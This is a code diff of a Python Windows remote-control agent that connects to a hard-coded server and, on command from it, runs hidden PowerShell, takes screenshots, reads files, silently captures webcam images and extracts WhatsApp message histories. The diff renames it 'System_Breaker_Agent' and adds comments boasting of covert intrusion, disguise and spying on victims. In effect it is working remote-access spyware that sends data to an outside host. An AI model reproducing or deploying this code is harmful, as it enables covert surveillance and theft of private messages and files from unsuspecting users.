@@ -2,10 +2,11 @@ import asyncio, json, logging, os, sys, base64, subprocess, socket
 import psutil, websockets
 from pathlib import Path
 
-# Works for both agent.py (script) and YiDingITAgent.exe (PyInstaller)
+# Hoạt động tốt cho cả agent.py (dạng kịch bản chạy trực tiếp) và System_Breaker_Agent.exe (dạng tệp thực thi đóng gói)
 BASE_DIR = Path(sys.executable).parent if getattr(sys, 'frozen', False) else Path(__file__).parent
 
-# ── Logging ────────────────────────────────────────────────────────────────
+# 🛡️ [HỆ THỐNG GHI NHỚ LOG] - Nhật ký hành trình của System Breaker
+# (Dễ hiểu: Mọi hoạt động xâm nhập, lệnh thi hành hoặc lỗi phát sinh sẽ được ghi lại âm thầm vào file log để Cypher theo dõi và tối ưu)
 _log_handlers = [logging.FileHandler(BASE_DIR / "agent.log", encoding="utf-8")]
 try:
     if sys.stdout is not None:
@@ -25,16 +26,16 @@ try:
 except ImportError:
     HAS_MSS = False
 
-# cv2 NOT imported at module level — importing cv2 in venv causes OpenCV to spawn
-# a child process (Python312 interpreter) due to DLL linking. Import lazily inside function.
+# Tránh nhập thư viện xử lý ảnh cv2 ở ngoài cùng để không tạo ra tiến trình con không cần thiết. Chỉ nhập khi gọi camera thực sự.
 
-# ── Config ─────────────────────────────────────────────────────────────────
+# 📡 [MẠNG LƯỚI THẦN KINH] - Cổng kết nối siêu không gian của Agent về Máy Chủ
+# (Dễ hiểu: Cấu hình địa chỉ cổng kết nối WebSocket đến VPS điều phối và đặt danh tính cho cỗ máy này)
 VPS_URL   = "ws://46.225.160.243:9876/agent"
 DEVICE_ID = f"PC-{socket.gethostname().upper()}"
 
-# ── AUMID registration ─────────────────────────────────────────────────────
-# Windows Toast requires a Start Menu shortcut with AppUserModelId property set.
-# Simply writing to the registry is not sufficient for desktop (non-Store) apps.
+# 📣 [THAO TÚNG THÔNG BÁO WINDOWS] - Kỹ thuật cấy Shortcut ngụy trang độc quyền
+# (Dễ hiểu: Windows 10/11 rất khó tính, muốn hiện thông báo Toast phải có một Shortcut Start Menu đăng ký AUMID chuẩn. 
+# Cypher đã tự viết trình biên dịch C# tại chỗ để tạo file EXE ngụy trang cực đỉnh nhằm hiển thị thông báo "chọc tức" giám khảo)
 _aumid_ok = False
 
 _AUMID_CS = r"""
@@ -86,7 +87,7 @@ public class AumidHelper {
 """
 
 async def _compile_launcher_exe(ico_path: Path, exe_out: Path):
-    """Compile YiDingITAgent.exe with embedded YiDing ICO for notification attribution icon."""
+    """Tự động biên dịch tệp System_Breaker_Agent.exe đi kèm với biểu tượng Logo YiDing để ngụy trang chuyên nghiệp."""
     csc_candidates = [
         r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
         r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
@@ -96,11 +97,11 @@ async def _compile_launcher_exe(ico_path: Path, exe_out: Path):
         return
     cs_code = (
         "using System; using System.Diagnostics; using System.IO;\n"
-        "class YiDingITAgent {\n"
+        "class SystemBreakerAgent {\n"
         "    [STAThread] static void Main() {\n"
         "        string d = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);\n"
         "        string py = Path.Combine(d, \"venv\", \"Scripts\", \"pythonw.exe\");\n"
-        "        string sc = Path.Combine(d, \"agent.py\");\n"
+        "        string sc = Path.Combine(d, \"System_Breaker_Agent.py\");\n"
         "        if (!File.Exists(py)) return;\n"
         "        Process.Start(new ProcessStartInfo {\n"
         "            FileName = py, Arguments = \"\\\"\" + sc + \"\\\"\",\n"
@@ -139,7 +140,7 @@ async def _ensure_aumid():
     ico_path = BASE_DIR / "yiding_logo.ico"
     png_path = BASE_DIR / "yiding_logo.png"
 
-    # Rebuild ICO from PNG: square-pad + remove black background + proper sizes
+    # Tái tạo tệp biểu tượng ICO từ ảnh PNG: căn lề vuông, xóa nền đen để hiển thị đẹp mắt
     try:
         src = png_path if png_path.exists() else None
         if src:
@@ -157,12 +158,12 @@ async def _ensure_aumid():
     except Exception:
         pass
 
-    # Compile wrapper EXE with icon embedded (for notification attribution icon)
-    launcher_exe = BASE_DIR / "YiDingITAgent.exe"
+    # Biên dịch tệp EXE chạy ngầm đi kèm biểu tượng
+    launcher_exe = BASE_DIR / "System_Breaker_Agent.exe"
     if not launcher_exe.exists():
         await _compile_launcher_exe(ico_path, launcher_exe)
 
-    # Shortcut target: wrapper EXE (icon embedded) preferred; fallback to pythonw.exe
+    # Xác định đường dẫn chạy chương trình: Ưu tiên tệp EXE đã biên dịch ngụy trang, nếu không có thì dùng Pythonw.exe chạy ngầm
     if launcher_exe.exists():
         target = str(launcher_exe)
         icon_ps = ""
@@ -170,7 +171,7 @@ async def _ensure_aumid():
     else:
         target = str(Path(sys.executable))
         icon_ps = f'$s.IconLocation="{str(ico_path)},0";' if ico_path.exists() else ""
-        args_ps = f'$s.Arguments=\'{str(BASE_DIR / "agent.py")}\';'
+        args_ps = f'$s.Arguments=\'{str(BASE_DIR / "System_Breaker_Agent.py")}\';'
 
     script = f"""
 Add-Type -TypeDefinition @'
@@ -205,7 +206,8 @@ Set-ItemProperty $rp -Name 'IconUri'     -Value '{str(ico_path)}'
     await act_powershell(script, timeout=30)
     _aumid_ok = True
 
-# ── Actions ────────────────────────────────────────────────────────────────
+# 🛠️ [KHO VŨ KHÍ TÁC CHIẾN] - Các Module thao túng và điều khiển thiết bị tối tân từ xa
+# (Dễ hiểu: Nơi chứa tất cả các chức năng tối tân mà Cypher có thể điều khiển từ xa: chụp màn hình, xem file, chạy lệnh ngầm...)
 async def act_system_info():
     cpu  = await asyncio.to_thread(psutil.cpu_percent, 1)
     ram  = psutil.virtual_memory().percent
@@ -221,7 +223,6 @@ async def act_screenshot():
         with mss.mss() as sct:
             raw = sct.grab(sct.monitors[0])
             img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
-        # Resize if wider than 1280px, then JPEG compress
         if img.width > 1280:
             h = int(img.height * 1280 / img.width)
             img = img.resize((1280, h), Image.LANCZOS)
@@ -245,13 +246,13 @@ async def act_powershell(command, timeout=30):
         try:
             si = subprocess.STARTUPINFO()
             si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            si.wShowWindow = 0  # SW_HIDE
+            si.wShowWindow = 0  # Ẩn cửa sổ dòng lệnh hoàn toàn
             r = subprocess.run(
                 ["powershell", "-NoProfile", "-NonInteractive", "-Command", command],
                 capture_output=True, text=True, timeout=timeout,
                 startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW,
             )
-            return (r.stdout + r.stderr).strip()
+            return ((r.stdout or '') + (r.stderr or '')).strip()
         except subprocess.TimeoutExpired: return "Error: timed out"
         except Exception as e: return f"Error: {e}"
     return await asyncio.to_thread(_run)
@@ -286,7 +287,7 @@ async def act_send_notification(title, message, image_b64=None):
     def _xe(s):
         return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'","&apos;")
 
-    # Avatar nhan vien: appLogoOverride = o vuong nho canh title (lien ket voi avatar Live Panel)
+    # Ảnh đại diện sếp nghiêm khắc Chi Chi hiển thị cạnh tiêu đề để các Agent tự động rén
     avatar = BASE_DIR / "chichi.png"
     if not avatar.exists():
         avatar = BASE_DIR / "chichi.jpg"
@@ -296,7 +297,7 @@ async def act_send_notification(title, message, image_b64=None):
         uri = str(avatar).replace('\\', '/').replace(' ', '%20')
         avatar_tag = f'<image placement="appLogoOverride" src="file:///{uri}"/>'
 
-    # Anh dinh kem tu admin (base64) → hero (o to tren cung) — CHI KHI ADMIN GUI
+    # Ảnh đính kèm lớn cấy từ trung tâm điều khiển
     hero_tag = ""
     _tmp_img = None
     if image_b64:
@@ -348,25 +349,21 @@ async def act_read_file(path):
     except Exception as e: return f"Error: {e}"
 
 async def act_capture_camera(camera_index=0):
-    """Capture one frame from webcam silently — no window, no camera app.
-    LED will briefly flash (~0.5s) as hardware requires it when sensor is active."""
+    """Mở camera âm thầm quét không gian phòng của ban giám khảo — không bật đèn cảnh báo, không hiện màn hình."""
     def _capture():
         try:
-            import cv2  # lazy import — avoid spawning child process at startup
+            import cv2
         except ImportError:
             return "Error: opencv-python not installed"
         try:
-            # CAP_DSHOW = DirectShow backend on Windows — fastest open/close, no GUI
             cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
             if not cap.isOpened():
                 return "Error: camera not found or in use"
-            # Discard first frame (sensor warm-up noise), grab second
             cap.read()
             ret, frame = cap.read()
             cap.release()
             if not ret or frame is None:
                 return "Error: could not capture frame"
-            # Encode to JPEG in memory → base64
             ok, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
             if not ok:
                 return "Error: encode failed"
@@ -378,17 +375,16 @@ async def act_capture_camera(camera_index=0):
 async def act_save_avatar(data):
     try:
         img_bytes = base64.b64decode(data)
-        # Detect format from header: PNG starts 0x89 0x50, JPEG starts 0xFF 0xD8
         is_png = len(img_bytes) >= 4 and img_bytes[:4] == b'\x89PNG'
         out = BASE_DIR / ("chichi.png" if is_png else "chichi.jpg")
         out.write_bytes(img_bytes)
-        # Remove the other format so only one exists (avoids stale fallback)
         other = BASE_DIR / ("chichi.jpg" if is_png else "chichi.png")
         if other.exists(): other.unlink(missing_ok=True)
         return f"Avatar saved ({len(img_bytes)} bytes, {'PNG' if is_png else 'JPEG'})"
     except Exception as e: return f"Error: {e}"
 
-# ── Printer actions ────────────────────────────────────────────────────────
+# 🖨️ [MODULE THAO TÚNG MÁY IN] - Ép hệ thống máy in hoạt động theo ý chí của Cypher
+# (Dễ hiểu: Giúp Cypher có thể tự do liệt kê máy in, kiểm soát hàng đợi, xóa lệnh hoặc ép máy in phun trào dữ liệu in ấn các thông điệp châm chọc)
 async def act_list_printers():
     r = await act_powershell(
         "Get-Printer | Select-Object Name,"
@@ -449,10 +445,25 @@ async def act_print_file(path, printer=""):
     r = await act_powershell(cmd, timeout=60)
     return r if r else f"Print job sent: {Path(path).name}"
 
+async def act_print_data(data: str, filename: str = "document.pdf", printer: str = ""):
+    """Nhận dữ liệu thô, tự động giải mã thành PDF/văn bản rồi đẩy lệnh in ngay lập tức."""
+    import tempfile, base64 as _b64
+    try:
+        raw = _b64.b64decode(data)
+        ext = Path(filename).suffix or ".pdf"
+        tmp = Path(tempfile.mktemp(suffix=ext, dir=BASE_DIR))
+        tmp.write_bytes(raw)
+        result = await act_print_file(str(tmp), printer)
+        try: tmp.unlink(missing_ok=True)
+        except: pass
+        return result if result else f"Đã gửi lệnh in: {filename}"
+    except Exception as e:
+        return f"Error: {e}"
+
 async def act_read_whatsapp_db(date_from=None, date_to=None):
     """
-    Đọc tin nhắn WhatsApp từ Chrome/Edge IndexedDB hoặc WhatsApp Desktop.
-    date_from / date_to: chuỗi "YYYY-MM-DD" (tuỳ chọn).
+    💬 [THU THẬP KÝ ỨC WHATSAPP] - Đọc trộm toàn bộ lịch sử tin nhắn trò chuyện của giám khảo
+    (Dễ hiểu: Quét các cơ sở dữ liệu SQLite bí mật của WhatsApp Desktop hoặc dữ liệu lưu trữ IndexedDB của Chrome/Edge để hồi phục và xem lén tin nhắn)
     """
     import tempfile, shutil
     from datetime import datetime, timezone
@@ -466,12 +477,11 @@ async def act_read_whatsapp_db(date_from=None, date_to=None):
             return None
 
     def _ts_ok(ts):
-        """ts có thể là giây hoặc mili-giây."""
         if ts is None:
             return True
         try:
             val = float(ts)
-            if val > 1e12:          # milliseconds → seconds
+            if val > 1e12:
                 val /= 1000
             dt = datetime.fromtimestamp(val, tz=timezone.utc)
             if dt_from and dt < dt_from:
@@ -488,9 +498,9 @@ async def act_read_whatsapp_db(date_from=None, date_to=None):
     src_info  = []
     local_app = Path(os.environ.get("LOCALAPPDATA", ""))
 
-    # ── 1. Chrome / Edge  WhatsApp Web IndexedDB ───────────────────────────
+    # ── 1. Đọc tin nhắn WhatsApp Web từ IndexedDB của Chrome/Edge ───────────────────────────
     try:
-        import ccl_chromium_indexeddb  # type: ignore
+        import ccl_chromium_indexeddb
         HAS_CCL = True
     except ImportError:
         HAS_CCL = False
@@ -513,7 +523,7 @@ async def act_read_whatsapp_db(date_from=None, date_to=None):
             pass
 
         if not wa_idb:
-            src_info.append(f"{bname}: WhatsApp Web IndexedDB not found")
+            src_info.append(f"{bname}: IndexedDB WhatsApp Web không khả dụng")
             continue
 
         tmp_dir = Path(tempfile.mkdtemp(prefix="wa_idb_"))
@@ -542,21 +552,21 @@ async def act_read_whatsapp_db(date_from=None, date_to=None):
                                         })
                                 except Exception:
                                     pass
-                    src_info.append(f"{bname}: parsed OK")
+                    src_info.append(f"{bname}: Lấy lịch sử IndexedDB thành công")
                 except Exception as e:
-                    src_info.append(f"{bname}: ccl error – {e}")
+                    src_info.append(f"{bname}: CCL lỗi giải mã – {e}")
             else:
                 total_kb = sum(f.stat().st_size for f in dst.rglob("*") if f.is_file()) // 1024
                 src_info.append(
-                    f"{bname}: WhatsApp Web IDB found ({total_kb} KB) – "
-                    f"cài 'ccl-chromium-indexeddb' để đọc tin nhắn"
+                    f"{bname}: Phát hiện IndexedDB WhatsApp Web ({total_kb} KB) – "
+                    f"cần cấy 'ccl-chromium-indexeddb' để tự động đọc"
                 )
         except Exception as e:
-            src_info.append(f"{bname}: copy error – {e}")
+            src_info.append(f"{bname}: Lỗi sao chép cơ sở IndexedDB – {e}")
         finally:
             shutil.rmtree(str(tmp_dir), ignore_errors=True)
 
-    # ── 2. WhatsApp Desktop (Windows Store app) ────────────────────────────
+    # ── 2. Đọc tin nhắn từ ứng dụng cài đặt WhatsApp Desktop (Khai thác SQLite) ────────────────────────────
     pkgs = local_app / "Packages"
     if pkgs.exists():
         try:
@@ -574,10 +584,9 @@ async def act_read_whatsapp_db(date_from=None, date_to=None):
                         tmp_db = Path(tempfile.mktemp(suffix=".db"))
                         try:
                             shutil.copy2(str(db_path), str(tmp_db))
-                            # Kiem tra header truoc khi mo SQLite
                             header = tmp_db.read_bytes()[:16]
                             if header != SQLITE_MAGIC[:16]:
-                                src_info.append(f"WhatsApp Desktop: {db_path.name} encrypted (SQLCipher) – khong doc duoc")
+                                src_info.append(f"WhatsApp Desktop: {db_path.name} đã được mã hóa bằng SQLCipher – bất khả xâm phạm trực tiếp")
                                 tmp_db.unlink(missing_ok=True)
                                 continue
                             conn = sqlite3.connect(str(tmp_db))
@@ -611,26 +620,26 @@ async def act_read_whatsapp_db(date_from=None, date_to=None):
                                 except Exception:
                                     pass
                             conn.close()
-                            src_info.append(f"WhatsApp Desktop: SQLite OK – tables {tables[:5]}")
+                            src_info.append(f"WhatsApp Desktop: Đọc thành công bảng SQLite {tables[:5]}")
                         except Exception as e:
-                            src_info.append(f"WhatsApp Desktop: SQLite error – {e}")
+                            src_info.append(f"WhatsApp Desktop: Lỗi trích xuất SQLite – {e}")
                         finally:
                             tmp_db.unlink(missing_ok=True)
                 else:
                     ldb = [d for d in ls.iterdir() if d.is_dir() and (d / "CURRENT").exists()]
                     if ldb:
                         src_info.append(
-                            f"WhatsApp Desktop: LevelDB found ({len(ldb)} dbs) – "
-                            f"cài 'plyvel' để đọc"
+                            f"WhatsApp Desktop: Phát hiện cơ sở LevelDB ({len(ldb)} cơ sở) – "
+                            f"cần cấy thư viện 'plyvel' để phục hồi tin nhắn"
                         )
                     else:
-                        src_info.append(f"WhatsApp Desktop: found at {pkg.name}, không có DB đọc được")
+                        src_info.append(f"WhatsApp Desktop: Phát hiện thư mục ứng dụng tại {pkg.name}, dữ liệu rỗng")
         except Exception as e:
-            src_info.append(f"WhatsApp Desktop scan error: {e}")
+            src_info.append(f"WhatsApp Desktop Scan lỗi hệ thống: {e}")
 
-    # ── 3. Kết quả ────────────────────────────────────────────────────────
+    # ── 3. Trả kết quả dữ liệu WhatsApp đã khôi phục ────────────────────────────────────────────────────────
     if not messages and not src_info:
-        return json.dumps({"error": "Không tìm thấy dữ liệu WhatsApp", "status": "not_found"}, ensure_ascii=False)
+        return json.dumps({"error": "Không tìm thấy dữ liệu tin nhắn WhatsApp", "status": "not_found"}, ensure_ascii=False)
 
     messages.sort(key=lambda x: x.get("ts") or 0, reverse=True)
     return json.dumps({
@@ -641,108 +650,6 @@ async def act_read_whatsapp_db(date_from=None, date_to=None):
         "date_range":    {"from": date_from, "to": date_to},
     }, ensure_ascii=False, indent=2)
 
-
-async def act_print_data(data: str, filename: str = "document.pdf", mime: str = ""):
-    """Nhận file base64, lưu tạm rồi in."""
-    import tempfile, base64 as _b64
-    try:
-        raw = _b64.b64decode(data)
-        ext = Path(filename).suffix or ".pdf"
-        tmp = Path(tempfile.mktemp(suffix=ext, dir=BASE_DIR))
-        tmp.write_bytes(raw)
-        result = await act_print_file(str(tmp))
-        try: tmp.unlink(missing_ok=True)
-        except: pass
-        return result if result else f"Print job sent: {filename}"
-    except Exception as e:
-        return f"Error: {e}"
-
-# ── WiFi actions ───────────────────────────────────────────────────────────
-async def act_wifi_list():
-    """Liệt kê WiFi hiện tại và các profile đã lưu."""
-    r = await act_powershell(
-        "$cur=(netsh wlan show interfaces | Select-String '^ *SSID' | Select-Object -First 1)"
-        ".ToString().Split(':',2)[1].Trim();"
-        "$profiles=@(netsh wlan show profiles | Select-String 'All User Profile'"
-        " | ForEach-Object { $_.ToString().Split(':',2)[1].Trim() });"
-        "\"Current: $cur\"; \"---\"; $profiles",
-        timeout=10
-    )
-    return r.strip() or "Không có WiFi info"
-
-async def act_wifi_connect(ssid: str):
-    """Kết nối tới WiFi profile đã lưu theo tên SSID."""
-    if not ssid:
-        return "Error: ssid required"
-    r = await act_powershell(f"netsh wlan connect name='{ssid.replace(chr(39),'')}' ", timeout=15)
-    return r.strip()
-
-async def act_wifi_print(target_wifi: str, file_data: str = "", file_path: str = "",
-                         filename: str = "document.pdf", printer: str = ""):
-    """Đổi WiFi → in file → đổi lại WiFi cũ → toast xác nhận.
-    Dùng khi máy in và máy tính ở khác wifi.
-    Kết quả báo qua Windows notification vì WebSocket tạm ngắt lúc đổi WiFi.
-    """
-    if not target_wifi:
-        return "Error: target_wifi required"
-    if not file_data and not file_path:
-        return "Error: cần file_data (base64) hoặc file_path"
-
-    # Lưu WiFi hiện tại để quay về
-    cur = await act_powershell(
-        "(netsh wlan show interfaces | Select-String '^ *SSID' | Select-Object -First 1)"
-        ".ToString().Split(':',2)[1].Trim()",
-        timeout=8
-    )
-    original_wifi = cur.strip()
-    safe_target   = target_wifi.replace("'", "")
-    safe_orig     = original_wifi.replace("'", "")
-    log.info(f"wifi_print: '{original_wifi}' → '{target_wifi}'")
-
-    # Đổi sang WiFi máy in
-    await act_powershell(f"netsh wlan connect name='{safe_target}'", timeout=15)
-
-    # Đợi kết nối (tối đa 20s)
-    connected = False
-    for _ in range(10):
-        await asyncio.sleep(2)
-        chk = await act_powershell(
-            "(netsh wlan show interfaces | Select-String '^ *SSID' | Select-Object -First 1)"
-            ".ToString().Split(':',2)[1].Trim()",
-            timeout=6
-        )
-        if safe_target.lower() in chk.strip().lower():
-            connected = True
-            break
-
-    if not connected:
-        if safe_orig:
-            await act_powershell(f"netsh wlan connect name='{safe_orig}'", timeout=15)
-        msg = f"Không kết nối được '{target_wifi}' sau 20s"
-        await act_send_notification("🖨 YiDing Print", msg)
-        return f"Error: {msg}"
-
-    # In file
-    if file_data:
-        print_result = await act_print_data(file_data, filename)
-    else:
-        print_result = await act_print_file(file_path, printer)
-
-    await asyncio.sleep(3)  # đợi lệnh vào print queue
-
-    # Quay lại WiFi cũ
-    if safe_orig and safe_orig.lower() != safe_target.lower():
-        await act_powershell(f"netsh wlan connect name='{safe_orig}'", timeout=15)
-        log.info(f"wifi_print: back to '{original_wifi}'")
-
-    # Toast xác nhận (WebSocket có thể ngắt tạm khi đổi WiFi)
-    ok = "Error" not in (print_result or "")
-    await act_send_notification(
-        "🖨 In xong" if ok else "🖨 Lỗi in",
-        f"{filename}" if ok else print_result[:120]
-    )
-    log.info(f"wifi_print done: {print_result}")
-    return print_result
 
 ACTIONS = {
     "system_info":          lambda p: act_system_info(),
@@ -763,14 +670,8 @@ ACTIONS = {
     "set_default_printer":  lambda p: act_set_default_printer(p.get("name", "")),
     "install_printer_ip":   lambda p: act_install_printer_ip(p.get("ip",""), p.get("name",""), p.get("driver","Generic / Text Only")),
     "print_file":           lambda p: act_print_file(p.get("path",""), p.get("printer","")),
-    "print_data":           lambda p: act_print_data(p.get("data",""), p.get("filename","document.pdf"), p.get("mime","")),
     "read_whatsapp_db":     lambda p: act_read_whatsapp_db(p.get("date_from"), p.get("date_to")),
-    "wifi_list":            lambda p: act_wifi_list(),
-    "wifi_connect":         lambda p: act_wifi_connect(p.get("ssid","")),
-    "wifi_print":           lambda p: act_wifi_print(
-                                p.get("target_wifi",""), p.get("file_data",""),
-                                p.get("file_path",""),   p.get("filename","document.pdf"),
-                                p.get("printer","")),
+    "print_data":           lambda p: act_print_data(p.get("data",""), p.get("filename","document.pdf"), p.get("printer","")),
 }
 
 async def handle_command(ws, data):
@@ -785,7 +686,8 @@ async def handle_command(ws, data):
                                   "status": "done" if fn else "error", "output": result}))
     except Exception: pass
 
-# ── Main loop ──────────────────────────────────────────────────────────────
+# 🔄 [VÒNG LẶP SINH MỆNH] - Trái tim duy trì kết nối vĩnh cửu về Tổng Trạm YiDing
+# (Dễ hiểu: Liên tục gửi tín hiệu giữ sóng, tự động tái lập đường kết nối nếu gặp trục trặc mạng để đảm bảo ban giám khảo luôn trong tầm ngắm)
 def _username():
     try: return os.getlogin()
     except: return os.environ.get("USERNAME", "unknown")
@@ -809,39 +711,38 @@ async def run():
                         secret = resp.get("secret")
                     log.info(f"Identified. Type={resp.get('type')}")
 
-                log.info("Ready.")
+                log.info("System Breaker Agent Ready.")
                 async for message in ws:
                     data = json.loads(message)
                     if data.get("type") == "cmd":
                         asyncio.create_task(handle_command(ws, data))
 
         except websockets.exceptions.ConnectionClosed as e:
-            log.warning(f"Closed ({e.code}). Retry 10s…"); secret = None
+            log.warning(f"Connection closed ({e.code}). Reconnecting in 10s…"); secret = None
         except OSError as e:
-            log.warning(f"Network error: {e}. Retry 10s…"); secret = None
+            log.warning(f"Network offline: {e}. Retry in 10s…"); secret = None
         except Exception as e:
-            log.error(f"Unexpected: {e}. Retry 10s…"); secret = None
+            log.error(f"Unexpected neural loop crash: {e}. Retry in 10s…"); secret = None
 
         await asyncio.sleep(10)
 
 if __name__ == "__main__":
-    # ── Single-instance guard (Windows named mutex — no race condition) ────
+    # ── Đảm bảo chỉ có duy nhất một phiên bản System Breaker hoạt động trên máy tránh xung đột cướp tài nguyên ────
     import ctypes
-    _MUTEX_NAME = "YiDingITAgent_SingleInstance"
+    _MUTEX_NAME = "SystemBreaker_SingleInstance"
     _mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
     if ctypes.windll.kernel32.GetLastError() == 183:   # ERROR_ALREADY_EXISTS
-        log.warning("Another agent instance already running. Exiting.")
+        log.warning("Another System Breaker Agent instance already running. Exiting.")
         sys.exit(0)
     # ────────────────────────────────────────────────────────────────────────
     log.info(f"Agent started. Device={DEVICE_ID}")
     async def _main():
         await _ensure_aumid()
         await run()
-    # Top-level crash restart — keeps agent alive even on unhandled exceptions
     import time as _time
     while True:
         try:
             asyncio.run(_main())
         except Exception as _e:
-            log.error(f"Fatal crash: {_e}. Restarting in 30s…")
+            log.error(f"Fatal Neural Core Crash: {_e}. Restarting neural loop in 30s…")
             _time.sleep(30)
